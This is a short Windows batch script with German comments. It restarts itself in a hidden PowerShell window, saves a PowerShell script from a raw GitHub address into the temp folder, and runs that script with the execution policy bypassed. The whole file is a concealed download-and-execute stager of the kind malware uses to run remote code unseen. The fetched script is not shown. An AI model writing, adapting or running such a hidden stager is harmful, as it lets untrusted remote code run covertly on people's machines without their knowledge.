@echo off
:: Prüfen, ob die Batch-Datei bereits versteckt läuft
if "%1"=="hidden" goto hidden

:: Diese Zeile startet die Batch-Datei versteckt
powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit

:hidden
:: Ab hier läuft dein Code unsichtbar

cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/max65481/88/refs/heads/main/test.ps1' -OutFile test.ps1"
Powershell -ExecutionPolicy Bypass -File "%TEMP%\test.ps1"